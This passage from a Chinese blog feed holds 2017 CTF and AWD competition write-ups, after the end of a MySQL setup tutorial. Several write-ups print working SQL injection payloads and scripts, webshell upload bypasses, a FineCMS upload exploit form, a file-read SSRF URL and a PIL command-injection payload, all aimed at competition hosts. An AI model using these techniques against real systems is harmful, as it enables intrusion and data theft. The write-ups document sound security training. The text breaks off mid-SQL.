<h1 id="Mysql配置"><a href="#Mysql配置" class="headerlink" title="Mysql配置"></a>Mysql配置</h1><p>先安装带有可用的mysql5系列社区版资源的rpm包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</div></pre></td></tr></table></figure></p>
<p>查看当前可用的mysql安装资源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum repolist enabled | grep &quot;mysql.*-community.*&quot;</div></pre></td></tr></table></figure></p>
<p>直接使用yum的方式安装MySQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install mysql-community-server     #这一步很慢</div></pre></td></tr></table></figure></p>
<p>加入开机启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable mysqld</div></pre></td></tr></table></figure></p>
<p>启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start mysqld</div></pre></td></tr></table></figure></p>
<p>初始化（重置密码，删除匿名用户，远程登录配置等）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_secure_installation</div></pre></td></tr></table></figure></p>
<p>登录数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -uroot -p</div></pre></td></tr></table></figure></p>
<p>选择数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use database；</div></pre></td></tr></table></figure></p>
<p>导入sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">source /work/xxx.sql</div></pre></td></tr></table></figure></p>
<h1 id="配置网站数据库信息"><a href="#配置网站数据库信息" class="headerlink" title="配置网站数据库信息"></a>配置网站数据库信息</h1><p>根据要搭建的网站来配置</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很久之前帮老师写的LAMP（linux+apache+mysql+php）教程，自己也用这个方法配了好多台服务器，发到博客记录一下，也希望能给大家带来一些帮助。&lt;br&gt;
    
    </summary>
    
    
      <category term="运维" scheme="https://www.codemonster.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="LAMP" scheme="https://www.codemonster.cn/tags/LAMP/"/>
    
  </entry>
  
  <entry>
    <title>2017 第三届福建省高校网络空间安全大赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/</id>
    <published>2017-10-31T14:15:27.000Z</published>
    <updated>2018-05-04T07:47:50.009Z</updated>
    
    <content type="html"><![CDATA[<p>10月27参加的省赛，今年难度较之去年提高了不少，最终拿到了一等奖，算是比较满意了，但是AWD场打的还是不够好，还需要不断学习，WriteUp如下（后续会补上赛后做出的题）：<br><a id="more"></a></p>
<h1 id="上午CTF场"><a href="#上午CTF场" class="headerlink" title="上午CTF场"></a>上午CTF场</h1><h2 id="要想会，先学会"><a href="#要想会，先学会" class="headerlink" title="要想会，先学会"></a>要想会，先学会</h2><p>官方提示<code>ping</code>，在流量包文件中找<code>icmp协议</code>，<br><img src="/img/2017byb1.png" alt=""><br>按照时间排序，得到一串奇怪的东西，转ascii有很多字符不可见，猜测是有一些偏移，于是写了个py脚本暴力所以可能的偏移，得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">a=[<span class="number">144</span>,<span class="number">150</span>,<span class="number">150</span>,<span class="number">139</span>,<span class="number">145</span>,<span class="number">165</span>,<span class="number">120</span>,<span class="number">139</span>,<span class="number">91</span>,<span class="number">160</span>,<span class="number">93</span>,<span class="number">167</span>,<span class="number">70</span>]</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">-50</span>,<span class="number">50</span>):</div><div class="line">  flag=<span class="string">''</span></div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">    flag+=chr(i+j)</div><div class="line">  <span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017byb2.png" alt=""></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>上传题，限制了后缀，burp抓包，<code>%00截断</code>上传网马，菜刀连接，在config里找到数据库配置，在数据库中找到flag，手快一血</p>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>Fuzz的时候发现%25会报错<code>sprintf</code>，就猜测是格式化漏洞，但是没有网查资料，后来官方的提示竟然直接给了payload：<br>使用了两次sprintf导致格式化字符串漏洞（可构造<code>admin%1$&#39; and 1=1#</code>与<code>admin%1$&#39; and 1=2#</code>），sql盲注，flag在flag表flag列，flag的字符集为0123456789abcdeflg{}-<br>脚本撸出来单线程太慢，于是用burpsuite一个一个字符爆破的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin%1$&apos; and (ascii(mid((select flag from flag limit 1),&#123;0&#125;,1))=&#123;1&#125;)#</div></pre></td></tr></table></figure></p>
<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p>给了两个靶机，一个web，一个pwn，到最后pwn也没人做出来<br>Web大致有两个利用方向，一个是common目录下的home.php存在反序列化漏洞，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a=@$_POST[<span class="string">'a'</span>];</div><div class="line">@unserialize($a);</div></pre></td></tr></table></figure></p>
<p>因为对这块不熟所以没利用成功，又翻啊翻，在lib/User.php 里发现了上传部分的逻辑<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">'username'</span>]===<span class="string">"admin"</span>)&#123;</div><div class="line">        <span class="keyword">include_once</span> <span class="keyword">__DIR__</span>.<span class="string">"/File.php"</span>;</div><div class="line">        $up=<span class="keyword">new</span> File();</div><div class="line">        <span class="keyword">if</span>($up-&gt;save())&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</div><div class="line">        &#125;       </div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"error.tpl"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</div><div class="line">    $_SESSION=<span class="keyword">array</span>();</div><div class="line">    session_destroy();</div><div class="line">    header(<span class="string">"location: ./index.php"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">updatepass</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">        $username=addslashes($_POST[<span class="string">'username'</span>]);</div><div class="line">        $password=md5($_POST[<span class="string">'password'</span>]);</div><div class="line">        $sql=<span class="string">"update user set password='$password' where username='$username' "</span>;</div><div class="line">        <span class="keyword">if</span> (mysql_query($sql))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重点在<code>upload函数</code>和<code>updatepass函数</code>，upload限制了只有<code>admin</code>账号才能上传文件，而updatepass可以<code>修改任意用户密码</code>，这里就有了思路</p>
<ol>
<li>通过updatepass函数<code>修改admin密码</code></li>
<li>登录admin账号<code>上传shell</code>（shell的后缀要大小写绕过黑名单限制）</li>
<li>通过shell<code>读取flag并提交</code></li>
</ol>
<p>思路很清晰，然而脚本是个大问题，登录上传弄得手忙脚乱，前期很长一段时间全靠队友手动传shell，提交flag，脚本憋出来后大部分人都修复漏洞了，就很难受，最后基本是打npc和其他几个队，需要好好反思，权限维持这一块没弄，就在一台电脑试验了一下，准备好的代码提交框架也没用上，总之AWD还是很刺激的，最终的成绩也满理想，就是一等的奖金缩水了有点扎心。</p>
<p>比赛界面如下<br><img src="/img/2017byb3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;10月27参加的省赛，今年难度较之去年提高了不少，最终拿到了一等奖，算是比较满意了，但是AWD场打的还是不够好，还需要不断学习，WriteUp如下（后续会补上赛后做出的题）：&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 全国大学生软件测试大赛web安全赛分区决赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/</id>
    <published>2017-10-24T05:40:13.000Z</published>
    <updated>2018-07-28T06:19:37.052Z</updated>
    
    <content type="html"><![CDATA[<p>周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp<br><a id="more"></a></p>
<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>在burpsuite中修改host为<code>www.mooctest.net</code><br><img src="/img/2017-mooctest-sec-1.png" alt=""></p>
<h2 id="2-Babyupload"><a href="#2-Babyupload" class="headerlink" title="2.Babyupload"></a>2.Babyupload</h2><p>扫描得到upload.php，本地构造upload.html<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action=<span class="string">"http://114.55.36.69:46012/upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"upfile"</span>&gt;文件名：&lt;/label&gt;</div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>比赛的时候死活猜不出文件参数名，file、upload、uploadfile都试过，赛后经大佬提醒才知道是<code>upfile</code><br>也可以直接用curl上传文件，学到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://114.55.36.69:46012/upload.php -F &quot;upfile=@x.php&quot;</div></pre></td></tr></table></figure></p>
<p>上传后菜刀连接，查看web目录下的flag.php拿到flag<br><img src="/img/2017-mooctest-sec-2.png" alt=""></p>
<h2 id="3-curl"><a href="#3-curl" class="headerlink" title="3.curl"></a>3.curl</h2><p>过滤了<code>file:</code>后面的<code>/</code>，把<code>/</code>转成<code>0x2f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46013/index.php?url=file:0x2f0x2f/var/www/html/index.php</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017-mooctest-sec-3.png" alt=""></p>
<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>根据题目提示，下载trick-or-treat.war<br><img src="/img/2017-mooctest-sec-4.png" alt=""></p>
<h2 id="5-readme2"><a href="#5-readme2" class="headerlink" title="5.readme2"></a>5.readme2</h2><p>在js文件里发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46015/test/show.do?page=help.jsp</div></pre></td></tr></table></figure></p>
<p>猜测是任意文件读取，读取javaweb工程的<code>WEB-INF/web.xml</code>文件<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>接着读取<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>发现<code>key.jsp</code>，读取<code>key.jsp</code><br><img src="/img/2017-mooctest-sec-7.png" alt=""></p>
<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅<br><img src="/img/2017-mooctest-sec-8.png" alt=""></p>
<h2 id="7-hackedsite"><a href="#7-hackedsite" class="headerlink" title="7.hackedsite"></a>7.hackedsite</h2><p>扫描得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:46017/upload/phpspy.php</div></pre></td></tr></table></figure></p>
<p>百度搜索phpspy得到密码<code>angle</code>，连接大马拿到flag<br><img src="/img/2017-mooctest-sec-9.png" alt=""></p>
<h2 id="8-babysql3"><a href="#8-babysql3" class="headerlink" title="8.babysql3"></a>8.babysql3</h2><p>name字段存在注入，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=name` union select 1,2,flag from flag %23</div></pre></td></tr></table></figure></p>
<p><img src="/img/2017-mooctest-sec-10.png" alt=""></p>
<h2 id="9-snake"><a href="#9-snake" class="headerlink" title="9.snake"></a>9.snake</h2><p>提示了<code>PIL-RCE</code><br>参考<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md</a><br>构造poc文件中的代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(%pipe%cat /var/www/Flask/flag &gt; tmp/fffffff.png)</div></pre></td></tr></table></figure></p>
<p>上传得到flag<br><img src="/img/2017-mooctest-sec-11.png" alt=""></p>
<h2 id="10-thinkphp5"><a href="#10-thinkphp5" class="headerlink" title="10.thinkphp5"></a>10.thinkphp5</h2><p>无</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 全国大学生软件测试大赛web安全赛预赛 WriteUp</title>
    <link href="https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/"/>
    <id>https://www.codemonster.cn/2017/10/23/2017-mooctest-first-writeup/</id>
    <published>2017-10-23T12:20:13.000Z</published>
    <updated>2018-05-04T07:47:50.012Z</updated>
    
    <content type="html"><![CDATA[<p>其实就是慕测安恒杯<br>6月18日的夏季预赛线上赛，9月22日更新babysql，10月12日更新findpwd、服务发现、babylogin<br>10月23更新秋季预赛题目<br><a id="more"></a></p>
<h1 id="夏季预赛"><a href="#夏季预赛" class="headerlink" title="夏季预赛"></a>夏季预赛</h1><h2 id="根据ip查dns解析记录"><a href="#根据ip查dns解析记录" class="headerlink" title="根据ip查dns解析记录"></a>根据ip查dns解析记录</h2><p>题目原意是让我们用cmd的nslookup命令，我直接上dns反查网站查的</p>
<p>到这个网站查dns解析<a href="https://www.boip.net/ipv4/" target="_blank" rel="noopener">https://www.boip.net/ipv4/</a></p>
<p>flag为<code>this-is-flag</code></p>
<h2 id="编辑器泄露"><a href="#编辑器泄露" class="headerlink" title="编辑器泄露"></a>编辑器泄露</h2><p>题目提示编辑器泄露,fuzz后下载到了<code>login.php.swp</code>，用<code>vim -r login.php.swp</code>恢复得到源码，看到明文账号密码，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($userin==<span class="string">"admin94wo"</span>)</div><div class="line"><span class="keyword">if</span>($passin==<span class="string">"ca1buda0mima7ah4ha"</span>)</div></pre></td></tr></table></figure></p>
<p>用账号密码登录login.php得到flag，<code>flag{b4ckup_1s_normal}</code></p>
<h2 id="babywaf"><a href="#babywaf" class="headerlink" title="babywaf"></a>babywaf</h2><p>fuzz后发现 &lt; 被过滤了，构造post file=.&lt;./.&lt;./.&lt;./.&lt;./.&lt;./flag 提交得到flag，<code>flag{To0_young_2_simple!}</code></p>
<h2 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h2><p>题目提示让我们复现exp，该站用的是<code>finecms</code></p>
<p>百度得到此cms的一个上传漏洞，构造html文件如下，上传一个<code>phtml</code>后缀的一句话上去，菜刀连接在<code>/flag</code>得到flag，<code>flag{o1d_bug_t0_send_point!}</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">”utf-8″</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Finecms ajaxswfupload exp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">”http://114.55.88.132:20580/index.php?c</span>=<span class="string">attachment&amp;a</span>=<span class="string">ajaxswfupload”</span> <span class="attr">method</span>=<span class="string">”POST”</span> <span class="attr">enctype</span>=<span class="string">”multipart/form-data”</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”file”</span> <span class="attr">name</span>=<span class="string">”Filedata”</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”hidden”</span> <span class="attr">name</span>=<span class="string">”type”</span> <span class="attr">value</span>=<span class="string">”phtml”</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”hidden”</span> <span class="attr">name</span>=<span class="string">”size”</span> <span class="attr">value</span>=<span class="string">”100″</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”</span> <span class="attr">name</span>=<span class="string">”submit”</span> <span class="attr">value</span>=<span class="string">”上传文件”</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>这道题到最后也没做出来，报错注入注，过滤了<code>union</code>和<code>column_name</code>还有<code>*</code>，不知道字段名是啥</p>
<p>参考了<a href="http://www.wupco.cn/?p=3764" target="_blank" rel="noopener">http://www.wupco.cn/?p=3764</a><br>从该文章中可以得知这道注入题的核心代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"desc `error_&#123;$table&#125;`"</span>;</div><div class="line">$res = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(mysql_fetch_array($res)))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;no table detail&lt;/center&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sql = <span class="string">"select * from error_$&#123;table&#125; where id = $id"</span>;</div></pre></td></tr></table></figure></p>
<p>可以看出通过<code>desc</code>语句判断table是否存在，再执行下一个sql语句<br>DESC的语法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DESC tbl_name [col_name | wild]</div></pre></td></tr></table></figure></p>
<p>构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=flag` `a%&amp;id=3</div></pre></td></tr></table></figure></p>
<p>python脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line">r1=r.session()</div><div class="line">s=<span class="string">"abcdefghijklmnopqrstuvwxyz1234567890_"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">  url=<span class="string">"http://114.55.36.69:20680/index.php?table=flag` `&#123;0&#125;%&amp;id=3"</span></div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> s:</div><div class="line">    url2=url.format(str(flag+j))</div><div class="line">    r2=r1.get(url2)</div><div class="line">    <span class="keyword">if</span> <span class="string">"SQL"</span> <span class="keyword">in</span> r2.text:</div><div class="line">      flag+=j</div><div class="line">      <span class="keyword">print</span> flag</div><div class="line">      <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>得到<code>error_flag</code>表的字段名为<code>flag_you_will_never_know</code><br>再使用报错注入查询即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news&amp;id=3 -updatexml(1,concat(&apos;a=.&apos;,(select flag_you_will_never_know from error_flag)),1)#</div></pre></td></tr></table></figure></p>
<h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><p>nmap扫描后发现<code>rsync</code>开放<br>rsync空口令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::</span></div><div class="line"><span class="built_in">source</span> code   </div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync 118.178.18.181::source\ code/</span></div><div class="line">drwxr-xr-x        4096 2017/06/14 13:01:20 .</div><div class="line">-rw-r--r--          44 2017/06/14 13:01:20 flag.php</div><div class="line">-rw-r--r--          26 2017/06/14 13:01:20 index.php</div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># rsync -azv 118.178.18.181::source\ code/flag.php ~/flag.txt</span></div><div class="line">receiving incremental file list</div><div class="line"></div><div class="line">sent 19 bytes  received 41 bytes  120.00 bytes/sec</div><div class="line">total size is 44  speedup is 0.73</div><div class="line">[root@<span class="built_in">test</span> ~]<span class="comment"># cat flag.txt</span></div><div class="line">&lt;?php</div><div class="line"><span class="variable">$flag</span> = <span class="string">"flag&#123;rsync_i5_very_useful!&#125;"</span>;</div></pre></td></tr></table></figure></p>
<h2 id="findpwd"><a href="#findpwd" class="headerlink" title="findpwd"></a>findpwd</h2><p>题目提示了开发者用的ide是netbean，查看ide工作空间的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:20880/nbproject/private/private.xml</div></pre></td></tr></table></figure></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">project-private</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/project-private/1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">editor-bookmarks</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/editor-bookmarks/2"</span> <span class="attr">lastBookmarkId</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">open-files</span> <span class="attr">xmlns</span>=<span class="string">"http://www.netbeans.org/ns/projectui-open-files/2"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/index.php<span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span></div><div class="line">file:/var/www/html/fuckbean/f1ndmyp4ssw0rdnineverno.php</div><div class="line"><span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>file:/var/www/html/fuckbean/1.sql<span class="tag">&lt;/<span class="name">file</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">open-files</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">project-private</span>&gt;</span></div></pre></td></tr></table></figure>
<p>可以看到<code>1.sql</code>和<code>f1ndmyp4ssw0rdnineverno.php</code>两个文件<br>f1ndmyp4ssw0rdnineverno.php是个输入邮箱找回密码的页面<br>下载<code>1.sql</code>，这里就可以猜测可能是注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> fuckbean;</div><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> fuckbean;</div><div class="line"><span class="keyword">use</span> fuckbean;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</div><div class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">5</span>),</div><div class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>),</div><div class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</div><div class="line">mail    <span class="built_in">varchar</span>(<span class="number">50</span>)</div><div class="line">);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"admin"</span>,<span 